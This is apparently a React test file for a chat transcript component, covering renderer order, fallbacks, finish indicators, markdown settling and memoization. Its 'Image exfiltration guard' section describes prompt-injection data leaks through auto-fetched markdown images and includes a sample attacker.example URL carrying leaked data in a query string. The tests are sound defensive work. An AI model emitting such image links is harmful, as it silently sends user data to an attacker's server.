/**
 * ThreadTranscript — the open part-renderer registry's resolution order, the dev/prod fallback
 * contract, and the `MessageBlock` memoization budget from AGENT-CHAT-SPEC.md §9.
 *
 * `messageBlockRenderCounter` is imported directly from `./thread-message` (bypassing the
 * `agent-chat` barrel on purpose — it is not part of the public surface) to prove the memo
 * boundary in a controlled render-count harness.
 */
import { MantineProvider } from '@mantine/core'
import { cleanup, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, test } from 'bun:test'
import { definePartRenderers } from '../agent'
import type { ChatMessage, TranscriptPart } from '../agent'
import { messageBlockRenderCounter, ThreadTranscript } from './thread-message'

afterEach(cleanup)

function withNodeEnv<T>(value: string, fn: () => T): T {
  const original = process.env['NODE_ENV']
  process.env['NODE_ENV'] = value
  try {
    return fn()
  } finally {
    // `original` may be undefined (NODE_ENV unset) — assigning undefined through the index
    // signature isn't valid, so restore by deleting the key instead.
    if (original === undefined) delete process.env['NODE_ENV']
    else process.env['NODE_ENV'] = original
  }
}

function buildMessages(count: number): ChatMessage<TranscriptPart>[] {
  return Array.from({ length: count }, (_, i) => {
    const role: ChatMessage<TranscriptPart>['role'] = i % 2 === 0 ? 'user' : 'assistant'
    return {
      id: `m${i}`,
      role,
      parts: [{ id: `m${i}-p1`, type: 'text', text: `message ${i}` }],
      createdAt: i,
    }
  })
}

describe('resolution order', () => {
  test('a registered consumer renderer wins over the built-in union', () => {
    const renderers = definePartRenderers({
      'data-chart': () => <div data-testid="chart" />,
    })
    const messages: ChatMessage<TranscriptPart>[] = [
      {
        id: 'm1',
        role: 'assistant',
        parts: [{ id: 'p1', type: 'data-chart', spec: {} }],
        createdAt: 0,
      },
    ]

    render(
      <MantineProvider>
        <ThreadTranscript messages={messages} renderers={renderers} />
      </MantineProvider>,
    )

    expect(screen.getByTestId('chart')).toBeDefined()
  })

  test('a built-in AgentPart type still routes through PartList when unclaimed by renderers', () => {
    const messages: ChatMessage<TranscriptPart>[] = [
      {
        id: 'm1',
        role: 'assistant',
        parts: [{ id: 'p1', type: 'text', text: 'hello' }],
        createdAt: 0,
      },
    ]

    render(
      <MantineProvider>
        <ThreadTranscript messages={messages} />
      </MantineProvider>,
    )

    expect(screen.getByText('hello')).toBeDefined()
  })
})

describe('unknown-part fallback — never throws, dev-visible, prod-silent', () => {
  const messages: ChatMessage<TranscriptPart>[] = [
    {
      id: 'm1',
      role: 'assistant',
      parts: [{ id: 'p1', type: 'data-chart', spec: {} }],
      createdAt: 0,
    },
  ]

  test('renders a visible UnknownPartChip outside production', () => {
    withNodeEnv('development', () => {
      expect(() =>
        render(
          <MantineProvider>
            <ThreadTranscript messages={messages} />
          </MantineProvider>,
        ),
      ).not.toThrow()
      expect(screen.getByText(/Unknown part: data-chart/)).toBeDefined()
    })
  })

  test('renders nothing in production, and still never throws', () => {
    withNodeEnv('production', () => {
      expect(() =>
        render(
          <MantineProvider>
            <ThreadTranscript messages={messages} />
          </MantineProvider>,
        ),
      ).not.toThrow()
      expect(screen.queryByText(/Unknown part/)).toBeNull()
    })
  })
})

function messageWithFinish(
  finish: ChatMessage<TranscriptPart>['finish'],
): ChatMessage<TranscriptPart>[] {
  return [
    {
      id: 'm1',
      role: 'assistant',
      parts: [{ id: 'p1', type: 'text', text: 'hello' }],
      createdAt: 0,
      ...(finish === undefined ? {} : { finish }),
    },
  ]
}

describe('finish indicator (AGENT-CHAT-SPEC.md §10)', () => {
  test('finish: stopped renders an indicator with accessible text', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish('stopped')} />
      </MantineProvider>,
    )

    expect(screen.getByText('Stopped')).toBeDefined()
  })

  test('finish: error renders an indicator with accessible text', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish('error')} />
      </MantineProvider>,
    )

    expect(screen.getByText('Error')).toBeDefined()
  })

  test('finish: complete renders no indicator', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish('complete')} />
      </MantineProvider>,
    )

    expect(screen.queryByText('Stopped')).toBeNull()
    expect(screen.queryByText('Error')).toBeNull()
    expect(screen.queryByText('Complete')).toBeNull()
  })

  test("finish absent renders no indicator, identical to today's output", () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish(undefined)} />
      </MantineProvider>,
    )

    expect(screen.getByText('hello')).toBeDefined()
    expect(screen.queryByText('Stopped')).toBeNull()
    expect(screen.queryByText('Error')).toBeNull()
  })
})

// ── The settle fix ────────────────────────────────────────────────────────────
//
// `TextRenderer` used to hardcode `streaming`, so `Markdown` always ran in block-split mode and its
// tail block was unconditionally unsettled — a FINISHED message's last block never settled. Two
// visible symptoms, both asserted below: a trailing ```mermaid fence stayed a CodeBlock forever,
// and the last block of every finished message permanently hid its copy action.

const MERMAID_TAIL = 'intro paragraph\n\n```mermaid\ngraph TD\n  A --> B\n```'
const CODE_TAIL = 'intro paragraph\n\n```notalanguage\nfinal body\n```'

function assistantMessage(text: string): ChatMessage<TranscriptPart>[] {
  return [
    { id: 'm1', role: 'assistant', parts: [{ id: 'm1-p1', type: 'text', text }], createdAt: 0 },
  ]
}

describe('settled threading — a finished message settles its FINAL block', () => {
  test('a trailing mermaid fence upgrades out of the CodeBlock', async () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={assistantMessage(MERMAID_TAIL)} />
      </MantineProvider>,
    )

    // MermaidDiagram renders the SVG into a role="img" container; the unsettled path renders a
    // plain <pre> instead.
    expect(await screen.findByRole('img')).toBeDefined()
  })

  test('the final block keeps its copy action', async () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={assistantMessage(CODE_TAIL)} />
      </MantineProvider>,
    )

    await screen.findByText('final body')
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })
})

describe('settled threading — a streaming message leaves its tail unsettled', () => {
  test('the in-flight tail fence stays a copy-less CodeBlock', async () => {
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={[]}
          liveParts={[{ id: 'live-p1', type: 'text', text: MERMAID_TAIL }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    const code = await screen.findByText(/graph TD/)
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.queryByRole('img')).toBeNull()
    expect(screen.queryByLabelText('Copy code')).toBeNull()
  })

  test('the same message settles once the run stops streaming', async () => {
    const liveParts: TranscriptPart[] = [{ id: 'live-p1', type: 'text', text: MERMAID_TAIL }]
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript messages={[]} liveParts={liveParts} liveStatus="streaming" />
      </MantineProvider>,
    )

    await screen.findByText(/graph TD/)
    expect(screen.queryByRole('img')).toBeNull()

    // Same `liveParts` reference, only `liveStatus` flips — the `MessageBlock` memo comparator
    // must not swallow this final transition (it compares `streaming` explicitly).
    rerender(
      <MantineProvider>
        <ThreadTranscript messages={[]} liveParts={liveParts} liveStatus="done" />
      </MantineProvider>,
    )

    expect(await screen.findByRole('img')).toBeDefined()
  })
})

// ── Image exfiltration guard ──────────────────────────────────────────────────
//
// THIS IS A SECURITY REGRESSION TEST, NOT A RENDERING TEST. Images auto-fetch, so an off-origin
// `<img>` in model-generated markdown is a one-way prompt-injection exfiltration channel:
// `![](https://attacker.example/p.png?q=<whatever the model was told to leak>)` fires a GET the
// moment the transcript paints, with no click and nothing visible.
//
// The control is `Markdown`'s `contentTrust="untrusted"`, and it has already been lost once. The
// settle fix above changed `TextRenderer` from a hardcoded `streaming` to `streaming={!settled}`,
// and at the time `streaming` ALSO selected the image allowlist — so every FINISHED message (i.e.
// nearly the whole transcript) silently regained the open `https://` default. Trust is a property
// of WHERE THE TEXT CAME FROM; settledness is a property of when. They must never be the same prop
// again. The settled case below is the one that regressed.

const OFF_ORIGIN_IMAGE = 'https://attacker.example/pixel.png?q=leak'
const IMAGE_DOC = `![local](/assets/local.png)\n\n![probe](${OFF_ORIGIN_IMAGE})`

describe('transcript images — agent text is untrusted whether or not it has settled', () => {
  async function renderTranscript(streamingTurn: boolean) {
    const parts: TranscriptPart[] = [{ id: 'p1', type: 'text', text: IMAGE_DOC }]
    const { container } = render(
      <MantineProvider>
        {streamingTurn ? (
          <ThreadTranscript messages={[]} liveParts={parts} liveStatus="streaming" />
        ) : (
          <ThreadTranscript messages={assistantMessage(IMAGE_DOC)} />
        )}
      </MantineProvider>,
    )
    // `findByAltText` only ever matches an <img>, so `Markdown`'s Suspense text fallback cannot
    // satisfy it — this waits for the real pipeline, and its success also proves same-origin
    // images still render (an allowlist, not a blanket image kill).
    await screen.findByAltText('local')
    return container
  }

  test('a SETTLED assistant message does NOT render an off-origin https image', async () => {
    const container = await renderTranscript(false)

    expect(screen.getByAltText('local').getAttribute('src')).toBe('/assets/local.png')
    // Dropped whole: no <img> element, and the attacker origin never reaches the DOM at all —
    // not as a src, not as a srcset, not as text.
    expect(screen.queryByAltText('probe')).toBeNull()
    expect(container.querySelector('img[src^="https://"]')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  test('an in-flight assistant turn does not render one either', async () => {
    const container = await renderTranscript(true)

    expect(container.querySelector('img[src^="https://"]')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })
})

describe('MessageBlock memoization (AGENT-CHAT-SPEC.md §9)', () => {
  test('a streamed delta re-renders exactly one MessageBlock on a 50-message thread', () => {
    const messages = buildMessages(50)
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          liveParts={[{ id: 'live', type: 'text', text: 'a' }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    // Mount executes every MessageBlock once (nothing to bail out against yet) — that is not the
    // measurement. Reset the counter once the initial render has settled.
    messageBlockRenderCounter.count = 0

    // Same `messages` array reference (unchanged settled history) + a NEW `liveParts` array
    // reference (the streamed delta) — the one prop a delta actually changes.
    rerender(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          liveParts={[{ id: 'live', type: 'text', text: 'ab' }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    expect(messageBlockRenderCounter.count).toBe(1)
  })
})
